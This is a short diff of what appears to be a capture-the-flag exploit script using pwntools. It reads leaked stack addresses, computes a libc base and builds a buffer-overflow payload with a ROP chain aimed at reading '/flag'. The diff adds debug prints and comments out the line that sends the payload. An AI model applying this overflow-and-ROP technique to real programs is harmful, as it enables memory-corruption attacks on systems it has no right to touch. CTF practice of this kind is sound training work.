@@ -49,12 +49,17 @@ def rop(base, rbp):
 io = start()
 io.recvuntil(b"base pointer rbp: ")
 bp = int(io.recvline(keepends=False), 16)
+print(bp)
+
 io.recvuntil(b"will be stored: ")
 buf = int(io.recvline(keepends=False), 16)
+print(buf)
+
 libc_sys = 0x52290
 libc_base = libc_sys - 0x52290 
+
 payload = b'a'*(bp-buf)+b'/flag' +b'\0'*3 + rop(libc_base, bp)
-io.sendline(payload)
+# io.sendline(payload)
 
 io.interactive()
 
